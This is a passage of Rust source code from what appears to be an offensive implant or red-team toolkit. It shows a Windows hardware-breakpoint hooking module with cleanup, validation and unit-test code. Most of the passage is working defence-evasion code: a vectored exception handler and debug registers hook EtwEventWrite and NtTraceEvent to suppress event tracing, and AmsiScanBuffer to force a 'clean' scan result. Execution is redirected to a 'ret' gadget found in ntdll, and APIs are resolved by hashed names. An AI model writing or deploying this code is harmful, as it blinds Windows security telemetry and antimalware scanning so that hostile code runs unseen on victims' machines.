                    tracing::warn!(
                        "hw_bp_hook: failed to program debug regs for tid {}",
                        entry.thread_id
                    );
                    success = false;
                } else {
                    thread_count += 1;
                }

                // Resume the thread.
                let mut resume_count: u32 = 0;
                nt_resume(handle, &mut resume_count);

                let _ = crate::syscall!("NtClose", handle as u64);
            }
        }

        if thread32_next(snapshot, &mut entry) == 0 {
            break;
        }
    }

    let _ = crate::syscall!("NtClose", snapshot as u64);

    tracing::debug!(
        "hw_bp_hook: programmed debug registers for {} threads",
        thread_count,
    );

    success
}

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
pub unsafe fn install_for_all_threads() -> bool {
    false
}

/// Remove all hardware breakpoints and unregister the VEH handler.
///
/// # Safety
///
/// Must be called on Windows x86_64.  After this call, no hardware breakpoint
/// hooks will be active.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub unsafe fn cleanup() {
    // Clear all slot tables.
    for slot in 0..MAX_HW_BP_SLOTS {
        SLOT_ADDRESSES[slot].store(0, Ordering::Release);
        SLOT_CALLBACKS[slot].store(0, Ordering::Release);
        SLOT_INSN_SIZES[slot].store(0, Ordering::Release);
    }

    // Clear the state.
    let veh_handle = {
        let mut state = STATE.lock_recover();
        match &mut *state {
            Some(s) => {
                s.slots = [None, None, None, None];
                let h = s.veh_handle;
                s.veh_handle = 0;
                h
            }
            None => 0,
        }
    };

    // Reprogram debug registers for current thread (clears Dr0–Dr3).
    if let (Some(nt_get_ctx), Some(nt_set_ctx)) = (resolve_nt_get_context(), resolve_nt_set_context()) {
        let current_thread = -2isize as usize;
        program_debug_regs_for_thread(current_thread, nt_get_ctx, nt_set_ctx);
    }

    // Remove the VEH handler.
    if veh_handle != 0 {
        if let Some(remove_veh) = resolve_remove_veh() {
            remove_veh(veh_handle as *mut std::ffi::c_void);
        }
        VEH_REGISTERED.store(false, Ordering::Release);
    }

    tracing::debug!("hw_bp_hook: cleanup complete");
}

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
pub unsafe fn cleanup() {}

/// Check whether a specific address is currently hooked.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub fn is_hooked(target_addr: usize) -> bool {
    find_slot_by_addr(target_addr).is_some()
}

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
pub fn is_hooked(_target_addr: usize) -> bool {
    false
}

/// Re-validate all installed hooks by checking that the target addresses
/// are still in committed executable memory.
///
/// Returns `true` if all hooks are valid, `false` if any hook's target
/// has been unloaded or changed protection.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub unsafe fn revalidate() -> bool {
    let mut all_valid = true;
    for slot in 0..MAX_HW_BP_SLOTS {
        let addr = SLOT_ADDRESSES[slot].load(Ordering::Relaxed);
        if addr == 0 {
            continue;
        }
        // Quick validation: check if the first byte is readable.
        let ptr = addr as *const u8;
        if ptr.is_null() {
            all_valid = false;
            continue;
        }
        // Use a simple read — if the page is not committed, this will fault.
        // In practice, we rely on the VEH handler to catch any issues.
        // A safer approach would use NtQueryVirtualMemory, but that's heavier.
        let _ = core::ptr::read_volatile(ptr);
    }
    all_valid
}

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
pub unsafe fn revalidate() -> bool {
    true
}

// ── Thread entry structure for CreateToolhelp32Snapshot ──────────────────────

#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
#[repr(C)]
struct ThreadEntry32 {
    size: u32,
    cnt_usage: u32,
    thread_id: u32,
    owner_process_id: u32,
    base_priority: i32,
    _delta: usize,
}

// ── Integration: ETW/AMSI bypass callbacks ──────────────────────────────────

/// ETW bypass callback: redirects execution to a `ret` gadget.
///
/// When EtwEventWrite (or any hooked ETW function) is hit, this callback:
/// 1. Sets RAX = 0 (STATUS_SUCCESS).
/// 2. Redirects RIP to a pre-resolved `ret` gadget in ntdll.
/// 3. Returns `false` (callback handled RIP, don't auto-advance).
///
/// The `reg_ptr` points to the CONTEXT's RAX field.  The callback can modify
/// any register by offsetting from this pointer.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
static ETW_RET_GADGET: AtomicUsize = AtomicUsize::new(0);

/// Callback for ETW bypass hooks.
///
/// # Safety
///
/// Called from VEH handler.  No heap allocation, no locks, no blocking.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn etw_bypass_callback(reg_ptr: *mut u64) -> bool {
    // reg_ptr points to CONTEXT.Rax.  Layout:
    //   +0  = RAX
    //   +8  = RCX
    //   +16 = RDX
    //   +24 = RBX
    //   +32 = RSP
    //   +40 = RBP
    //   +48 = RSI
    //   +56 = RDI
    //   +64 = R8
    //   +72 = R9
    //   +80 = R10
    //   +88 = R11
    //   +96 = R12
    //   +104= R13
    //   +112= R14
    //   +120= R15
    //   +128= RIP

    // Set return value to 0 (SUCCESS).
    *reg_ptr = 0;

    // Redirect RIP to the ret gadget.
    let gadget = ETW_RET_GADGET.load(Ordering::Relaxed);
    if gadget != 0 {
        // RIP is at offset +128 from RAX.
        let rip_ptr = reg_ptr.add(16); // Skip RAX..R15 = 16 registers × 8 bytes
        // Actually the layout has more fields before RIP. Let's use ContextRegs offset.
        // The reg_ptr is actually &mut (*context).rax. RIP is at ContextRegs.rip.
        // From rax to rip: 16 reg fields × 8 bytes = 128 bytes.
        let rip_ptr = reg_ptr.add(128 / 8);
        *rip_ptr = gadget as u64;
    }

    // Return false — callback handled RIP, don't auto-advance.
    false
}

/// Callback for AMSI bypass hooks.
///
/// Sets RAX = 0 (AMSI_RESULT_CLEAN) and redirects to ret gadget.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn amsi_bypass_callback(reg_ptr: *mut u64) -> bool {
    // AMSI_RESULT_CLEAN = 0
    *reg_ptr = 0;

    let gadget = ETW_RET_GADGET.load(Ordering::Relaxed);
    if gadget != 0 {
        let rip_ptr = reg_ptr.add(128 / 8);
        *rip_ptr = gadget as u64;
    }

    false
}

/// Pre-resolve a `ret` gadget from ntdll for use in bypass callbacks.
///
/// Must be called before any bypass hooks are installed.  The gadget is
/// stored in a global atomic for lock-free access from the VEH handler.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn resolve_ret_gadget() -> bool {
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return false,
    };

    // Try NtClose first — it's a small stub that often has a nearby `ret`.
    let nt_close = pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_NTCLOSE)
        .unwrap_or(0);
    if nt_close != 0 {
        // Scan up to 32 bytes for a `ret` (0xC3).
        let ptr = nt_close as *const u8;
        for i in 0..32usize {
            if *ptr.add(i) == 0xC3 {
                ETW_RET_GADGET.store(nt_close + i, Ordering::Release);
                tracing::debug!("hw_bp_hook: ret gadget resolved at {:#x}", nt_close + i);
                return true;
            }
        }
    }

    // Fallback: try RtlGetCurrentPeb.
    let peb_fn = pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"RtlGetCurrentPeb\0"),
    )
    .unwrap_or(0);
    if peb_fn != 0 {
        let ptr = peb_fn as *const u8;
        for i in 0..16usize {
            if *ptr.add(i) == 0xC3 {
                ETW_RET_GADGET.store(peb_fn + i, Ordering::Release);
                tracing::debug!("hw_bp_hook: ret gadget (fallback) at {:#x}", peb_fn + i);
                return true;
            }
        }
    }

    tracing::warn!("hw_bp_hook: failed to resolve ret gadget from ntdll");
    false
}

/// Install hardware breakpoint hooks for ETW suppression.
///
/// Hooks `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` using up to
/// 2 debug register slots (EtwEventWrite + NtTraceEvent, prioritizing the most
/// commonly used functions).  Falls back to inline patching if all slots are
/// occupied or the hooks can't be installed.
///
/// # Returns
///
/// `true` if at least one hook was installed successfully.
///
/// # Safety
///
/// Must be called on Windows x86_64, before ETW-instrumented code runs.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub unsafe fn install_etw_bypass() -> bool {
    // Resolve the ret gadget first.
    if ETW_RET_GADGET.load(Ordering::Relaxed) == 0 {
        if !resolve_ret_gadget() {
            tracing::warn!("hw_bp_hook: cannot install ETW bypass — no ret gadget");
            return false;
        }
    }

    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return false,
    };

    let mut installed = false;

    // Hook EtwEventWrite.
    if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITE) {
        // EtwEventWrite typically starts with `mov r10, rcx; mov eax, SSN`
        // which is 4C 8B D1 B8 — 4+ bytes.  The instruction at the entry
        // varies; we'll use instruction_size=0 and let the callback handle
        // RIP redirection (it points to ret gadget).
        match install_hw_bp(addr, etw_bypass_callback, 0) {
            Ok(_) => {
                installed = true;
                tracing::debug!("hw_bp_hook: ETW bypass installed on EtwEventWrite at {:#x}", addr);
            }
            Err(e) => tracing::warn!("hw_bp_hook: failed to hook EtwEventWrite: {}", e),
        }
    }

    // Hook NtTraceEvent (kernel ETW sink).
    if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_NTTRACEEVENT) {
        match install_hw_bp(addr, etw_bypass_callback, 0) {
            Ok(_) => {
                installed = true;
                tracing::debug!("hw_bp_hook: ETW bypass installed on NtTraceEvent at {:#x}", addr);
            }
            Err(e) => tracing::debug!("hw_bp_hook: NtTraceEvent hook skipped: {}", e),
        }
    }

    if installed {
        // Apply to all existing threads.
        install_for_all_threads();
    }

    installed
}

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
pub unsafe fn install_etw_bypass() -> bool {
    false
}

/// Install hardware breakpoint hook for AMSI bypass.
///
/// Hooks `AmsiScanBuffer` to force `AMSI_RESULT_CLEAN` return.  Uses one
/// debug register slot.
///
/// # Returns
///
/// `true` if the hook was installed successfully.
///
/// # Safety
///
/// Must be called on Windows x86_64.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub unsafe fn install_amsi_bypass() -> bool {
    // Resolve the ret gadget first.
    if ETW_RET_GADGET.load(Ordering::Relaxed) == 0 {
        if !resolve_ret_gadget() {
            tracing::warn!("hw_bp_hook: cannot install AMSI bypass — no ret gadget");
            return false;
        }
    }

    let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
    let hmod = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
        Some(b) => b,
        None => {
            tracing::debug!("hw_bp_hook: amsi.dll not loaded — AMSI bypass not needed");
            return true; // Not an error — AMSI isn't active.
        }
    };

    let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
    let scan_buf_addr = match pe_resolve::get_proc_address_by_hash(hmod, scan_buf_hash) {
        Some(a) => a,
        None => {
            tracing::warn!("hw_bp_hook: AmsiScanBuffer not found in amsi.dll");
            return false;
        }
    };

    match install_hw_bp(scan_buf_addr, amsi_bypass_callback, 0) {
        Ok(_) => {
            tracing::debug!("hw_bp_hook: AMSI bypass installed on AmsiScanBuffer at {:#x}", scan_buf_addr);
            install_for_all_threads();
            true
        }
        Err(e) => {
            tracing::warn!("hw_bp_hook: failed to hook AmsiScanBuffer: {}", e);
            false
        }
    }
}

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
pub unsafe fn install_amsi_bypass() -> bool {
    false
}

// ── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
mod tests {
    use super::*;

    /// Test: find_free_slot returns Some when no hooks are installed.
    #[test]
    fn test_find_free_slot_empty() {
        // No hooks installed — all slots should be free.
        let slot = find_free_slot();
        assert!(slot.is_some());
        assert!((0..MAX_HW_BP_SLOTS).contains(&slot.unwrap()));
    }

    /// Test: find_slot_by_addr returns None for unknown addresses.
    #[test]
    fn test_find_slot_by_addr_miss() {
        assert!(find_slot_by_addr(0xDEADBEEF).is_none());
    }

    /// Test: is_hooked returns false for unknown addresses.
    #[test]
    fn test_is_hooked_miss() {
        assert!(!is_hooked(0xDEADBEEF));
    }

    /// Test: free_slots returns 4 when no hooks are installed.
    #[test]
    fn test_free_slots_empty() {
        assert_eq!(free_slots(), MAX_HW_BP_SLOTS);
    }

    /// Test: install a hardware breakpoint on a test function and verify it fires.
    ///
    /// This test creates a simple function, installs a hardware execute
    /// breakpoint on it, calls the function, and verifies that the callback
    /// was invoked.
    #[test]
    fn test_install_and_fire_hw_bp() {
        static CALLBACK_FIRED: AtomicBool = AtomicBool::new(false);

        /// A simple test target function.
        /// The `volatile` prevents the compiler from optimizing it away.
        #[no_mangle]
        #[unsafe(naked)]
        unsafe extern "system" fn test_target() -> u32 {
            std::arch::naked_asm!(
                "xor eax, eax",
                "inc eax",
                "ret",
            );
        }

        /// Callback that records it was called and sets RAX = 0x42.
        unsafe fn test_callback(reg_ptr: *mut u64) -> bool {
            CALLBACK_FIRED.store(true, Ordering::Release);
            // Set RAX = 0x42 (magic value to verify callback modified context).
            *reg_ptr = 0x42;
            // Redirect RIP to the ret gadget to skip the function body.
            let gadget = ETW_RET_GADGET.load(Ordering::Relaxed);
            if gadget != 0 {
                let rip_ptr = reg_ptr.add(128 / 8);
                *rip_ptr = gadget as u64;
            }
            false // Callback handled RIP.
        }

        unsafe {
            // Resolve the ret gadget.
            resolve_ret_gadget();

            let target_addr = test_target as usize;
            let result = install_hw_bp(target_addr, test_callback, 0);

            if result.is_err() {
                // May fail if no debug register slots available (e.g., under debugger).
                tracing::warn!("test_install_and_fire_hw_bp: install failed: {:?}", result);
                return;
            }

            let bp = result.unwrap();
            assert_eq!(bp.address, target_addr);
            assert_eq!(bp.bp_type, BpType::Execute);
            assert!(bp.slot < 4);
            assert!(is_hooked(target_addr));

            // Call the target function — should trigger the breakpoint.
            let ret: u32 = test_target();

            // The callback should have fired and set RAX = 0x42.
            assert!(CALLBACK_FIRED.load(Ordering::Acquire));
            assert_eq!(ret, 0x42);

            // Clean up.
            remove_hw_bp(target_addr).unwrap();
            assert!(!is_hooked(target_addr));
        }
    }
}

// ── Non-windows stubs ──────────────────────────────────────────────────────

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
mod stubs {
    use super::*;

    // These stubs are already provided as public functions above with the
    // #[cfg(not(...))] guard.  This module is just a placeholder for any
    // additional non-windows functionality.
}
